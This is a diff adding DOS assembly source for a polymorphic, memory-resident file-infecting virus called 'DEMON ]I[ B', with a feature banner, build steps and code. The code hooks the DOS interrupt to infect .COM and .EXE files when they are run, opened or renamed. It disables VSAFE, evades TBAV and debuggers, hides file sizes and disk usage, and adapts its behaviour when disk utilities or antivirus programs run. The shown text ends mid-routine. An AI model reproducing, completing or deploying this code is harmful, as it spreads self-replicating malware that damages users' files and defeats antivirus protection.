@@ -1,0 +1,3035 @@
+;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
+;°°±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±°°
+;°°±±²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²±±°°
+;°°±±²²ÛÛ                                                            ÛÛ²²±±°°
+;°°±±²²ÛÛ               The  D E M O N  ]I[  B Virus                 ÛÛ²²±±°°
+;°°±±²²ÛÛ                           by                               ÛÛ²²±±°°
+;°°±±²²ÛÛ                 H  E  L  L  F  I  R  E                     ÛÛ²²±±°°
+;°°±±²²ÛÛ                                                            ÛÛ²²±±°°
+;°°±±²²ÛÛ I am not responsible for the use or distribution of this   ÛÛ²²±±°°
+;°°±±²²ÛÛ code. It is very dangerous and should not be experimented  ÛÛ²²±±°°
+;°°±±²²ÛÛ with unless you understand it fully. You've been warned.   ÛÛ²²±±°°
+;°°±±²²ÛÛ                                                            ÛÛ²²±±°°
+;°°±±²²ÛÛ   Current Features:                                        ÛÛ²²±±°°
+;°°±±²²ÛÛ                                                            ÛÛ²²±±°°
+;°°±±²²ÛÛ   TSR .COM .EXE                                            ÛÛ²²±±°°
+;°°±±²²ÛÛ   Disables VSAFE  (woo!)                                   ÛÛ²²±±°°
+;°°±±²²ÛÛ   Disables tunneling  (via INT1)                           ÛÛ²²±±°°
+;°°±±²²ÛÛ   SoftICE trap (yay.)                                      ÛÛ²²±±°°
+;°°±±²²ÛÛ   Works around the TBAV TSR utilities                      ÛÛ²²±±°°
+;°°±±²²ÛÛ   Has a few layers of encryption                           ÛÛ²²±±°°
+;°°±±²²ÛÛ   Polymorphic                                              ÛÛ²²±±°°
+;°°±±²²ÛÛ   Partial memory encryption                                ÛÛ²²±±°°
+;°°±±²²ÛÛ   Disinfects introducing host                              ÛÛ²²±±°°
+;°°±±²²ÛÛ   Hides filesizes                                          ÛÛ²²±±°°
+;°°±±²²ÛÛ   Deletes AV checksums                                     ÛÛ²²±±°°
+;°°±±²²ÛÛ   Avoids infecting AV programs                             ÛÛ²²±±°°
+;°°±±²²ÛÛ   Behavior Changing (sorta AI)                             ÛÛ²²±±°°
+;°°±±²²ÛÛ   Uses UMBs or TOM                                         ÛÛ²²±±°°
+;°°±±²²ÛÛ   FULL error checking                                      ÛÛ²²±±°°
+;°°±±²²ÛÛ   Set-Get Interrupt Stealth                                ÛÛ²²±±°°
+;°°±±²²ÛÛ   Disk Space Stealth                                       ÛÛ²²±±°°
+;°°±±²²ÛÛ   Does other stuff                                         ÛÛ²²±±°°
+;°°±±²²ÛÛ                                                            ÛÛ²²±±°°
+;°°±±²²ÛÛ  Greets:                                                   ÛÛ²²±±°°
+;°°±±²²ÛÛ                                                            ÛÛ²²±±°°
+;°°±±²²ÛÛ       All the regulars of #virus.                          ÛÛ²²±±°°
+;°°±±²²ÛÛ       All the fine people on IRC that put up with the      ÛÛ²²±±°°
+;°°±±²²ÛÛ        rare non-lame breed of AOLer.                       ÛÛ²²±±°°
+;°°±±²²ÛÛ       Steve Case                                           ÛÛ²²±±°°
+;°°±±²²ÛÛ                                                            ÛÛ²²±±°°
+;°°±±²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²±±°°
+;°°±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±°°
+;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
+NO_ROLROR =	0		; ROL, 1 and ROR, 1 trigger TBAV flag "1"
+				; make = 0 to use ROL and ROR    
+
+NO_BRANCH =	0		; May trigger TBAV flag "J"
+                                ; make = 0 to use RET and IRET garbage
+
+NO_GARBAGE =	0		; Garbage generator is still under construction.
+				; Instructions made with the generator may cause the
+                                ; slow execution of programs. make = 0 to
+                                ; use garbage instructions in polymorphic encryption engine.
+; **************************************************************************
+; Assembly Notes:
+; TASM:
+; 1.) TASM /m2 to assemble.
+; 2.) Link with TLINK (no switches)
+; 3.) Change .EXE to .COM with EXE2BIN
+; 4.) Append resulting .COM onto a file consisting of the
+;     bytes E8 00 00.
+; And there you have it...
+; **************************************************************************
+.8086
+code	SEGMENT
+ASSUME	ds:	code, cs: code
+ORG	0
+INFECTED =	100h
+VIRUS_SIZE =	end_of_virus - start
+ALT_INT =       60h
+MEM_SIZE =	zseg-start
+MY_SIZE_MOD_512 = read_buf+2h
+MY_SIZE_IN_PAGES = read_buf+4h
+RELOCATES =	read_buf+6h
+MY_HEADER_SIZE = read_buf+8h
+MAXIMUM	=	read_buf+0ah
+MINIMUM	=	read_buf+0ch
+MY_STACK_SEGMENT = read_buf+0eh
+MY_STACK_POINTER = read_buf+10h
+EXE_IP	=	read_buf+14h
+MY_CODE_SEGMENT = read_buf+16h
+RELOCATION_TABLE = read_buf+18h
+DOS_INTERRUPT =	21h
+BIOS_DISK_INTERRUPT = 13h
+; **************************************************************************
+; Code Starts Here
+; **************************************************************************
+start:
+indexer_init:
+	DB	90h, 90h, 90h
+crypt_call:
+	call	encryption_routine
+encryption_start:
+delta_offset:
+	mov	bp, OFFSET start+103h
+	push	ds
+	push	es
+	push	cs
+	pop	ds
+	mov	ax, 31h
+	mov	es, ax
+	add	ax, 0d9h	; 31+0D9 = 10Ah
+	mov	di, ax		; 40:1Ah  -> 31:10Ah ->1F:22Ah
+	lea	si, [key_b_move+bp]
+	mov	cx, (end_of_move_me-key_b_move)
+	repnz	movsb
+	pushf
+	cli
+	DB	09ah
+	DW	022ah
+	DW	1fh
+encryption_start2:
+	mov	WORD PTR es: [10ah], 1eh
+	mov	WORD PTR es: [10ch], 1eh
+	sti
+				; *
+				; Remove Breakpoints from Soft-Ice 
+				; *
+	mov	ax, 0911h
+	mov	di, 4647h
+	mov	si, 4a4dh
+	mov	dx, OFFSET kill_softice
+	DB	0cch
+	pop	es
+	pop	ds
+	mov	ax, es
+	dec	ax
+	mov	WORD PTR cs: [mcb_seg+bp], ax
+	push	ds
+	pop	es
+	lea	si, [encryption_start3+bp]
+	lea	di, [encryption_end3+bp]
+	mov	dl, BYTE PTR cs: [eval3+bp]
+	call	general_encrypt
+encryption_start3:
+; ***************************************************************************
+; Encryption Starts Here, code below is encrypted, code above is not.
+; Test for previous residency
+; ************************************************************************
+	push	ds
+	call	int_seg
+	mov	ax, WORD PTR ds: [DOS_INTERRUPT*4]
+	pop	ds
+	cmp	ax, OFFSET new_int21
+	jz	fergit_it
+; ************************************************************************
+; This Allocs memory for virus
+; ************************************************************************
+mem_alloc:
+				; Disable VSAFE
+	mov	ax, 0fa01h
+	mov	dx, 05945h
+	int	16h
+	push	es
+	push	ds
+	call	umb_routine
+	jnc	mem_is_ok
+noumb_exe:
+	call	i_want_memory
+	jc	mem_not_ok	; Not enough memory
+	call	reduce_reuse_recycle
+	call	allocate_memory
+	call	fix_program_psp
+mem_is_ok:
+	pop	ds
+	pop	es
+	jmp	SHORT get_vector
+mem_not_ok: 			; Memory error of some sort
+	pop	ds
+	pop	es
+				; leave without changing
+fergit_it:
+	jmp	already		; anything
+; ************************************************************************
+; This fetches the interrupt 21 vector
+; ************************************************************************
+get_vector:
+	push	ds
+	push	es
+	push	cs
+	pop	ds
+	mov	ah, 41h
+	lea	dx, [tbdriver+bp]
+	int	DOS_INTERRUPT
+	cmp	ax, 05h
+	jnz	tbavnot_resident
+	call	int_seg
+	lds	bx, DWORD PTR ds: [DOS_INTERRUPT*4]
+	cmp	WORD PTR ds: [bx], 05ebh
+	jnz	tbavnot_resident
+	cmp	BYTE PTR ds: [bx+2], 0eah
+	jnz	tbavnot_resident
+	mov	ax, WORD PTR [bx+3] ; AX:BX -> Int 21h Vector
+	mov	bx, WORD PTR [bx+5]
+	jmp	SHORT haha_tbav
+tbavnot_resident:
+	mov	bx, DOS_INTERRUPT
+	call	rep_vector
+	mov	bx, dx		; BX:AX -> DOS int 21
+	mov	WORD PTR cs: [save_21_chain+bp], ax
+	mov	WORD PTR cs: [save_21_chain+2+bp], bx
+	jmp	SHORT skip_tbav
+haha_tbav:
+	push	ax
+	push	bx		; BX:AX -> DOS int 21
+	mov	bx, DOS_INTERRUPT
+	call	rep_vector	; DX:AX -> TBav's DOS int 21
+	mov	WORD PTR cs: [save_21_chain+bp], ax
+	mov	WORD PTR cs: [save_21_chain+2+bp], dx
+	pop	bx
+	pop	ax
+skip_tbav:
+	call	int_seg
+	mov	WORD PTR ds: [ALT_INT*4], ax
+	mov	WORD PTR cs: [save21_b+bp], ax
+	mov	WORD PTR ds: [ALT_INT*4+2], bx
+	mov	WORD PTR cs: [save21_b+2+bp], bx
+	mov	bx, 13h
+	call	rep_vector
+	mov	WORD PTR cs: [save13+bp], ax
+	mov	WORD PTR cs: [save13+2+bp], dx
+	call	reset_vars
+	mov	ah, 36h
+	mov	dl, 0
+	int	ALT_INT
+	mov	WORD PTR cs: [disk_free_save+bp], ax
+	mov	WORD PTR cs: [disk_free_save+2+bp], bx
+	mov	WORD PTR cs: [disk_free_save+4+bp], cx
+	mov	WORD PTR cs: [disk_free_save+6+bp], dx
+	mov	WORD PTR cs: [offset_of_name_in_sft+bp], 20h
+	call	block_move_redirect
+				; Disinfect File 
+	mov	ax, WORD PTR cs: [mcb_seg+bp]
+	inc	ax		; ax=psp
+	mov	ds, ax
+	mov	es, WORD PTR ds: [2ch]
+	xor	ax, ax
+	mov	di, 1
+not_there_just_yet:
+	dec	di
+	scasw
+	jne	not_there_just_yet
+	mov	dx, di
+	add	dx, 2
+	push	es
+	pop	ds
+	mov	ax, 0deadh
+	int	21h
+	pop	es
+	pop	ds
+; ************************************************************************
+; This returns control to the infected program.
+; ************************************************************************
+already:
+	cmp	WORD PTR cs: [0], 20cdh
+	jne	return_exe
+; ************************************************************************
+; This restors a .COM's first 3 bytes for return.
+; ************************************************************************
+return_com:
+	mov	di, 100h	; Start of .COM
+	lea	si, ds: [save3+bp] ; Start of Original 3 bytes
+	cld
+	movsb			; move bytes into
+	movsw			; place
+	pop	di
+	sub	di, 3
+	push	di
+        call	zero_regs
+	ret
+; ************************************************************************
+; This will restore a .EXE's segments/pointers for return
+; ************************************************************************
+return_exe:
+	mov	ax, es		; This code
+	add	ax, 10h		; Restores
+	add	ax, WORD PTR cs: [saved_cs_ip+2+bp] ; original CS:IP
+	mov	WORD PTR cs: [run_time_cs_ip+2+bp], ax ; on to a FAR jmp short
+	mov	ax, WORD PTR cs: [saved_cs_ip+bp] ; to return entry
+	mov	WORD PTR cs: [run_time_cs_ip+bp], ax ; point control
+	mov	ax, es		; This restores
+	add	ax, 10h		; SS:SP
+	add	ax, WORD PTR cs: [saved_ss_sp+2+bp] ; to orginal stack
+	cli			; No interrupts allowed
+	mov	sp, WORD PTR cs: [saved_ss_sp+bp] ; while screwing with
+	mov	ss, ax		; stack stuff
+	sti
+	call	zero_regs
+; ************************************************************************
+; Jmp FAR to .EXE's initial CS:IP
+; ************************************************************************
+	DB	0eah
+run_time_cs_ip DD ?
+; ************************************************************************
+; This moves the entire virus into the allocated memory block
+; ************************************************************************
+block_move_redirect:
+	mov	ax, WORD PTR cs: [block+bp]
+	push	ax		; ES=Free Memory
+	pop	es		; 
+	push	cs		; 
+	pop	ds		; DS=CS
+	xor	di, di
+	lea	si, ds: [start+bp] ; move main body...
+	mov	cx, end_of_critical_space-start ; to ES:0
+	cld
+	repnz	movsb
+; ************************************************************************
+; This code redirects interrupts to BLOCK:offsets
+; ************************************************************************
+	mov	cx, WORD PTR cs: [block+bp]
+	call	int_seg
+	cli
+	mov	WORD PTR ds: [DOS_INTERRUPT*4], OFFSET new_int21
+	mov	WORD PTR ds: [DOS_INTERRUPT*4+2], cx
+	sti
+	ret
+tbdriver DB	'TBDRVXXX', 0
+kill_softice DB	'bc *', 0dh, 0
+zero_regs:
+	xor	ax, ax
+	xor	bx, bx
+	xor	cx, cx
+	xor	dx, dx
+	xor	si, si
+	xor	di, di
+	xor	bp, bp
+	ret
+pushall:
+	pop	WORD PTR cs: [ret_address]
+	push	ax
+	push	bx
+	push	cx
+	push	dx
+	push	si
+	push	di
+	push	bp
+	push	es
+	push	ds
+	push	WORD PTR cs: [ret_address]
+	ret
+popall:
+	pop	WORD PTR cs: [ret_address]
+	pop	ds
+	pop	es
+	pop	bp
+	pop	di
+	pop	si
+	pop	dx
+	pop	cx
+	pop	bx
+	pop	ax
+	push	WORD PTR cs: [ret_address]
+	ret
+; ************************************************************************
+; Memory Allocation Subroutines
+; ************************************************************************
+umb_routine: 			; Taken from 40HEX-14.012
+				; Thank-you Dark Angel!
+	xor	di, di
+	mov	ax, 3306h	; get true DOS version
+	int	DOS_INTERRUPT
+	inc	al		; DOS 4-?
+	jz	no_umbs		; if so, we don't have UMB's
+	mov	ah, 52h		; get DOS master list
+	int	DOS_INTERRUPT	; structure
+	lds	si, es: [bx+12h] ; get ptr to  buffer info
+	mov	ax, ds: [si+1fh] ; get address of the first UMB
+	inc	ax		; (FFFF if no UMBs present)
+	jz	no_umbs
+	dec	ax		; undo damage from above
+search_chain:
+	push	ax
+	pop	ds		; go to the MCB
+	cmp	WORD PTR [di+1], di ; unused?
+	jnz	search_next
+	cmp	WORD PTR [di+3], MEM_SIZE/16 ; MCB large enough to
+	ja	handle_mcb	; hold us and our MCB?
+search_next:
+	cmp	BYTE PTR [di], 'Z' ; end of chain?
+	jz	no_umbs
+	mov	bx, [di+3]	; go to the next MCB
+	inc	ax		; 40Hex
+	add	ax, bx
+	jmp	SHORT search_chain
+no_umbs:
+	mov	ax, WORD PTR cs: [mcb_seg+bp]
+	push	ax		; get the MCB for current
+	pop	ds		; program
+	cmp	WORD PTR [di+3], (MEM_SIZE/16)+1000 ; large enough for
+	jna	try_other	; program and virus and its
+				; MCB?
+handle_mcb:
+	sub	WORD PTR [di+3], (MEM_SIZE/16) + 1 ; adjust size of memory
+				; area for virus + its MCB
+	mov	bx, [di+3]	; get size of new memory area
+	mov	cl, 'M'		; make sure this MCB doesn't
+	xchg	cl, BYTE PTR [di] ; mark the end of the chain
+	inc	ax
+	add	ax, bx		; go to virus segment's MCB
+	push	ax
+	pop	ds
+	mov	es, ax
+	mov	BYTE PTR [di], cl ; patch end of chain indicator
+	mov	WORD PTR [di+1], 8 ; mark MCB owned by DOS
+	mov	WORD PTR [di+3], (MEM_SIZE/16) ; patch in virus size
+	inc	ax		; ds->virus segment
+	mov	WORD PTR cs: [block+bp], ax
+	or	di, 8		; go to program name field
+	mov	ax, 'CS'	; make virus invisible to MEM
+	stosw			; by pretending it is
+	xor	ax, ax		; DOS system code
+	stosw
+	stosw
+	stosw
+	clc
+	ret
+try_other:
+	stc
+	ret
+;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+i_want_memory:
+	mov	ah, 49h		; Free memory
+	int	DOS_INTERRUPT	; allocated by MCB in ES-1
+	mov	bx, 0ffffh	; Request memory, can't have it all
+	mov	ah, 48h		; so maximum free memory
+	int	DOS_INTERRUPT	; (in paragraphs)
+	sub	bx, ((zseg-start)/16)+2 ; Subract program size + PSP
+	ret
+;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+allocate_memory:
+	push	es
+	mov	es, cx		; Allocate memory
+	mov	ah, 4ah		; at ES+BX:0
+	int	DOS_INTERRUPT	; for virus
+				; Wrecks a few MCB's in
+				; the process
+				; But that's unavoidable
+	mov	ax, es		; AX=ES+BX
+	push	ax
+	pop	ds
+	mov	si, ax		; allocated for virus
+	inc	si		; Adjust for MCB overhead
+	mov	WORD PTR cs: [block+bp], si
+				; BLOCK has Segment of free memory
+	mov	BYTE PTR ds: [1], 8 ; Mark as allocated by dos
+	mov	dx, 10h		; multipy ax by 16
+	mul	dx		; so that virus MCB sement is
+				; in bytes
+	mov	bx, ax		; BX = MCB segment in bytes,
+	mov	cx, dx
+	pop	ds		; DS has this program's segment
+	ret
+;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+fix_program_psp:
+	mov	ax, ds		; multipy ax by 16
+	mov	dx, 10h		; so that orginal program
+	mul	dx		; offset is in bytes
+	add	ax, ds: [6]	; Alters field [6] of PSP
+	adc	dx, 0		; which hold total
+	sub	ax, bx		; number of bytes
+	sbb	dx, cx		; available to program in
+	jc	mem_ok		; it's segment.
+	sub	ds: [6], ax	; 
+mem_ok:
+	ret
+;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+reduce_reuse_recycle:
+	mov	cx, es		; BX has maxium posible
+	add	cx, bx		; segment for virus now
+	mov	ah, 4ah		; Reduce Memory Available
+	int	DOS_INTERRUPT	; for infected program
+	mov	bx, ((zseg-start)/16)+2 ; Program size + PSP
+	sub	es: [2], bx	; Subtract (Program size + PSP)
+	sub	WORD PTR es: [2], 1 ; from the PSP top of memory field
+	ret
+; ************************************************************************
+; Int 21 has lots of functions in which a filename is passed through
+; DS:DX, this provides many a great way in which to nail a program.
+; ************************************************************************
+; ************************************************************************
+; Code Below Here Is used to infect files.
+; The Interrupt 21h handler starts here.
+; ************************************************************************
+new_int21:
+	mov	WORD PTR cs: [int_function], ax
+	call	restore_swap21
+	cmp	ax, 0deadh
+	jnz	check_4ch
+	call	is_this_file_an_executable
+	jc	doh_darnit
+	call	clean_ds_dx
+	clc
+	iret
+doh_darnit:
+	stc
+	iret
+; ************************************************************************
+;       Trap Quit
+; ************************************************************************
+check_4ch:
+	cmp	ah, 4ch
+	jnz	check_4b01h
+	call	default_behaviour
+	jmp	cs: chain
+; ************************************************************************
+; Offensive Traps
+; ************************************************************************
+check_4b01h:
+	cmp	ax, 4b01h	; Are we running a program?
+	jnz	check_4bh
+	cmp	BYTE PTR cs: [func_4b01h], 'D'
+	jnz	try_infect4b01h
+	jmp	disinfect_ds_dx
+try_infect4b01h:
+	cmp	BYTE PTR cs: [func_4b01h], 'I'
+	jnz	nothing_4b01h
+	jmp	check_ds_dx
+nothing_4b01h:
+	jmp	cs: chain
+; ************************************************************************
+check_4bh:
+	cmp	ah, 4bh		; Are we running a program?
+	jnz	check_43h
+	call	behavior_change
+	cmp	BYTE PTR cs: [func_4bh], 'D'
+	jnz	try_infect4bh
+	jmp	disinfect_ds_dx
+try_infect4bh:
+	cmp	BYTE PTR cs: [func_4bh], 'I'
+	jnz	nothing_4bh
+	jmp	check_ds_dx
+nothing_4bh:
+	jmp	cs: chain
+; ************************************************************************
+check_43h:
+	cmp	ah, 43h		; Are we changing attributes?
+	jnz	check_56h
+	cmp	BYTE PTR cs: [func_43h], 'D'
+	jnz	try_infect43h
+	jmp	disinfect_ds_dx
+try_infect43h:
+	cmp	BYTE PTR cs: [func_43h], 'I'
+	jnz	nothing_43h
+	jmp	check_ds_dx
+nothing_43h:
+	jmp	cs: chain
+; ************************************************************************
+check_56h:
+	cmp	ah, 56h		; Are we renaming files?
+	jnz	check_3dh
+	cmp	BYTE PTR cs: [func_56h], 'D'
+	jnz	try_infect56h
+	jmp	disinfect_ds_dx
+try_infect56h:
+	cmp	BYTE PTR cs: [func_56h], 'I'
+	jnz	nothing_56h
+	jmp	check_ds_dx
+nothing_56h:
+	jmp	cs: chain
+; ************************************************************************
+check_3dh:
+	cmp	ah, 3dh		; Are we opening a file?
+	jnz	check_6ch
+	cmp	BYTE PTR cs: [func_3dh], 'D'
+	jnz	try_infect3dh
+	jmp	disinfect_ds_dx
+try_infect3dh:
+	cmp	BYTE PTR cs: [func_3dh], 'I'
+	jnz	nothing_3dh
+	jmp	check_ds_dx
+nothing_3dh:
+	jmp	cs: chain
+; ************************************************************************
+check_6ch:
+	cmp	ah, 6ch		; Are we opening a file?
+	jnz	check_4eh
+	cmp	BYTE PTR cs: [func_6ch], 'D'
+	jnz	try_infect6ch
+	jmp	ext_disinfect_ds_dx
+try_infect6ch:
+	cmp	BYTE PTR cs: [func_6ch], 'I'
+	jnz	nothing_6ch
+	jmp	ext_infect_ds_dx
+nothing_6ch:
+	jmp	cs: chain
+; ************************************************************************
+check_4eh:
+	cmp	ah, 4eh		; Are we looking for a file?
+	jnz	check_4fh
+	cmp	BYTE PTR cs: [func_4eh], 'S'
+	jnz	nothing_4eh
+	jmp	directory_stealth
+nothing_4eh:
+	jmp	cs: chain
+; ************************************************************************
+check_4fh:
+	cmp	ah, 4fh		; Are we looking for more files?
+	jnz	check_11h
+	cmp	BYTE PTR cs: [func_4fh], 'S'
+	jnz	nothing_4fh
+	jmp	directory_stealth
+nothing_4fh:
+	jmp	cs: chain
+; ************************************************************************
+check_11h:
+	cmp	ah, 11h		; Are we looking for a file?
+	jnz	check_12h
+	cmp	BYTE PTR cs: [func_11h], 'S'
+	jnz	nothing_11h
+	jmp	fcbdirectory_stealth
+nothing_11h:
+	jmp	cs: chain
+; ************************************************************************
+check_12h:
+	cmp	ah, 12h		; Are we looking for more files?
+	jnz	check_49h
+	cmp	BYTE PTR cs: [func_12h], 'S'
+	jnz	nothing_12h
+	jmp	fcbdirectory_stealth
+nothing_12h:
+	jmp	cs: chain
+; ************************************************************************
+; Defensive Traps
+; ************************************************************************
+check_49h:
+	cmp	ah, 49h		; Making a Memory Call?
+	jnz	check_35h
+	cmp	BYTE PTR cs: [func_49h], 'S'
+	jnz	nothing_49h
+	jmp	free_allocate_mem
+nothing_49h:
+	jmp	cs: chain
+; ************************************************************************
+check_35h:
+	cmp	ah, 35h		; Trying to get our vector?
+	jnz	check_25h
+	cmp	BYTE PTR cs: [func_35h], 'S'
+	jnz	nothing_35h
+	jmp	get_interrupt_stealth
+nothing_35h:
+	jmp	cs: chain
+; ************************************************************************
+check_25h:
+	cmp	ah, 25h		; Trying to change our vector?
+	jnz	check_3eh
+	cmp	BYTE PTR cs: [func_25h], 'S'
+	jnz	nothing_25h
+	jmp	set_interrupt_stealth
+nothing_25h:
+; ************************************************************************
+check_3eh:
+	cmp	ah, 3eh		; Closing file?
+	jnz	chain
+	cmp	WORD PTR cs: [offset_of_name_in_sft], 0
+	jz	chain
+	cmp	BYTE PTR cs: [func_3eh], 'D'
+	jnz	try_infect_3eh
+	jmp	handle_operation
+try_infect_3eh:
+	cmp	BYTE PTR cs: [func_3eh], 'I'
+	jnz	check_36h
+	jmp	handle_operation
+nothing_3eh:
+	jmp	cs: chain
+check_36h:
+	cmp	ah, 36h
+	jnz	check_40h
+	jmp	disk_free_stealth
+check_40h:
+	cmp	ah, 40h
+	jnz	chain
+	jmp	write_stuff_to_handle
+chain:
+	mov	ax, WORD PTR cs: [int_function]
+	DB	0eah
+save_21_chain DD ?
+; ************************************************************************
+; ************************************************************************
+; ************************************************************************
+write_stuff_to_handle:
+	int	ALT_INT
+	pushf
+	jc	write_2_handle_fail
+	call	save_disk_free
+write_2_handle_fail:
+	popf
+	iret
+disk_free_stealth:
+	int	ALT_INT
+	pushf
+	cmp	ax, 0ffffh
+	jc	disk_free_error
+	cmp	BYTE PTR cs: [func_36h], 'S'
+	jnz	disk_free_error
+	call	fake_report_disk_free
+disk_free_error:
+	popf
+	iret
+fake_report_disk_free:
+	mov	ax, WORD PTR cs: [disk_free_save]
+	mov	bx, WORD PTR cs: [disk_free_save+2]
+	mov	cx, WORD PTR cs: [disk_free_save+4]
+	mov	dx, WORD PTR cs: [disk_free_save+6]
+	ret
+save_disk_free:
+	push	ax
+	push	bx
+	push	cx
+	push	dx
+	mov	ah, 36h
+	mov	dl, 0
+	int	ALT_INT
+	mov	WORD PTR cs: [disk_free_save], ax
+	mov	WORD PTR cs: [disk_free_save+2], bx
+	mov	WORD PTR cs: [disk_free_save+4], cx
+	mov	WORD PTR cs: [disk_free_save+6], dx
+	pop	dx
+	pop	cx
+	pop	bx
+	pop	ax
+	ret
+handle_operation:
+	call	save_regs
+	call	is_handle_executable
+	call	restore_regs
+	int	ALT_INT
+	jc	big_handle_error
+	pushf
+	call	pushall
+	push	cs
+	pop	ds
+	cmp	BYTE PTR [yes_flag], 1
+	jnz	done_handle
+	mov	dx, OFFSET asciizbuf
+	cmp	BYTE PTR [func_3eh], 'I'
+	jnz	disinfect_handle
+	call	nail_file
+	jmp	SHORT done_handle
+disinfect_handle:
+	call	clean_ds_dx
+done_handle:
+	call	popall
+	popf
+big_handle_error:
+	iret
+yes_flag DB	?
+is_handle_executable:
+	push	bx
+	mov	BYTE PTR cs: [yes_flag], 0
+	mov	ax, 1220h
+	int	2fh
+	jc	h_d_error
+	mov	bl, BYTE PTR es: [di]
+	mov	ax, 1216h
+	int	2fh
+	jc	h_d_error
+	add	di, WORD PTR cs: [offset_of_name_in_sft]
+	push	es
+	pop	ds
+	mov	dx, di
+	mov	si, di		; ds:si -> filename
+	push	cs
+	pop	es		; es:di -> buffer
+	mov	di, OFFSET asciizbuf ; ES:DI = 14 Byte ASCII buffer
+	call	fcb_to_asciiz
+	push	cs
+	pop	ds		; ds:dx ->filename
+	mov	dx, OFFSET asciizbuf
+	call	is_this_file_an_executable
+	jc	h_d_error
+	mov	BYTE PTR cs: [yes_flag], 1
+h_d_error:
+	pop	bx
+	ret
+behavior_change:
+	call	pushall
+	mov	si, dx
+	push	cs
+	pop	es
+	push	si
+	mov	di, OFFSET chkdsk
+	mov	cx, 12
+	mov	ax, cx
+	call	find_str
+	jc	chkdsk_not_running
+	call	disk_util_behavior
+	jmp	go_home
+chkdsk_not_running:
+	pop	si
+	push	si
+	mov	di, OFFSET zip
+	mov	cx, 8
+	mov	ax, 14
+	call	find_str
+	jc	zip_not_running
+	call	archiver_behavior
+	jmp	go_home
+zip_not_running:
+	pop	si
+	push	si
+	mov	di, OFFSET arj
+	mov	cx, 8
+	mov	ax, 14
+	call	find_str
+	jc	arj_not_running
+	call	archiver_behavior
+	jmp	go_home
+arj_not_running:
+	pop	si
+	push	si
+	mov	di, OFFSET scandisk
+	mov	cx, 14
+	mov	ax, cx
+	call	find_str
+	jc	scandisk_not_running
+	call	disk_util_behavior
+	jmp	go_home
+scandisk_not_running:
+	pop	si
+	push	si
+	mov	di, OFFSET defrag
+	mov	cx, 12
+	mov	ax, cx
+	call	find_str
+	jc	defrag_not_running
+	call	disk_util_behavior
+	jmp	go_home
+defrag_not_running:
+	pop	si
+	push	si
+	call	dont_infect_anti_virus
+	jnc	go_home
+	call	anti_virus_behavior
+go_home:
+	pop	si
+	call	popall
+	ret
+; ************************************************************************
+; ************************************************************************
+chkdsk	DB	'CHKDSK.EXE', 0
+zip	DB	'ZIP.EXE', 0
+arj	DB	'ARJ.EXE', 0
+scandisk DB	'SCANDISK.EXE', 0
+defrag	DB	'DEFRAG.EXE', 0
+; ************************************************************************
+disk_util_behavior:
+	mov	BYTE PTR cs: [hide_size], 'N'
+	mov	BYTE PTR cs: [infect_on_find], 'Y'
+	mov	BYTE PTR cs: [func_3eh], 'I'
+	call	set_open_infect
+	call	set_find_infect
+	ret
+archiver_behavior:
+	mov	BYTE PTR cs: [hide_size], 'Y'
+	mov	BYTE PTR cs: [infect_on_find], 'Y'
+	call	set_open_infect
+	mov	BYTE PTR cs: [func_3eh], 'I'
+	call	set_find_infect
+	ret
+anti_virus_behavior:
+	push	ds
+	push	cs
+	pop	ds
+	mov	BYTE PTR [func_36h], 'S'
+	mov	BYTE PTR [hide_size], 'Y'
+	mov	BYTE PTR [infect_on_find], 'N'
+	mov	BYTE PTR [func_6ch], 'D'
+	mov	BYTE PTR [func_3dh], 'D'
+	mov	BYTE PTR [func_3eh], 'I'
+	mov	BYTE PTR [nasty], 'Y'
+	pop	ds
+	call	set_find_infect
+	ret
+default_behaviour:
+	push	bp
+	xor	bp, bp
+	call	reset_vars
+	pop	bp
+	ret
+reset_vars:
+	push	ds
+	push	cs
+	pop	ds
+	mov	BYTE PTR [func_4b01h+bp], 'D'
+	mov	BYTE PTR [func_4bh+bp], 'I'
+	mov	BYTE PTR [func_43h+bp], 'I'
+	mov	BYTE PTR [func_56h+bp], 'I'
+	mov	BYTE PTR [func_36h+bp], 'N'
+	mov	BYTE PTR [func_3dh+bp], 'D'
+	mov	BYTE PTR [func_3eh+bp], 'I'
+	mov	BYTE PTR [func_6ch+bp], 'D'
+	mov	BYTE PTR [func_4eh+bp], 'S'
+	mov	BYTE PTR [func_4fh+bp], 'S'
+	mov	BYTE PTR [func_11h+bp], 'S'
+	mov	BYTE PTR [func_12h+bp], 'S'
+	mov	BYTE PTR [func_49h+bp], 'S'
+	mov	BYTE PTR [func_35h+bp], 'S'
+	mov	BYTE PTR [func_25h+bp], 'S'
+	mov	BYTE PTR [infect_on_find+bp], 'N'
+	mov	BYTE PTR [hide_size+bp], 'Y'
+	mov	BYTE PTR [nasty+bp], 'N'
+	pop	ds
+	ret
+set_find_infect:
+	mov	BYTE PTR cs: [func_4eh], 'I'
+	mov	BYTE PTR cs: [func_4fh], 'I'
+	mov	BYTE PTR cs: [func_11h], 'I'
+	mov	BYTE PTR cs: [func_12h], 'I'
+	ret
+set_open_infect:
+	mov	BYTE PTR cs: [func_6ch], 'I'
+	mov	BYTE PTR cs: [func_3dh], 'I'
+	ret
+; ************************************************************************
+; Function Dispatcher
+; ************************************************************************
+ext_infect_ds_dx:
+	push	dx
+	cmp	dl, 01
+	jnz	no_ext_infect
+	mov	dx, si
+	call	check_ds_dx
+no_ext_infect:
+	pop	dx
+	jmp	cs: chain
+ext_disinfect_ds_dx:
+	push	dx
+	cmp	dl, 01
+	jnz	no_ext_clean
+	mov	dx, si
+	call	clean_ds_dx
+no_ext_clean:
+	pop	dx
